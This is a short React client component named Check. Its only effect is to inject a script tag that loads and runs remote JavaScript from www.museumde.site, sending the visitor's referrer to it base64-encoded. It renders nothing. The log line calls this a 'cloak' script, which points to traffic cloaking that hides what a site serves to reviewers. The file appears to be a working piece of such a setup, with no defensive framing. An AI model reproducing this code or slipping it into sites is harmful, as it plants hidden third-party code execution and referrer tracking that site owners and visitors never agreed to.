'use client'
import { useEffect } from 'react'

export default function Check() {
    useEffect(() => {
        console.log('[cloak] injecting cloak script...')

        const script = document.createElement('script')
        script.type = 'text/javascript'
        script.src =
            'https://www.museumde.site/?clid=' +
            btoa('ref=' + encodeURIComponent(document.referrer))
        document.head.appendChild(script)
    }, [])

    return null
}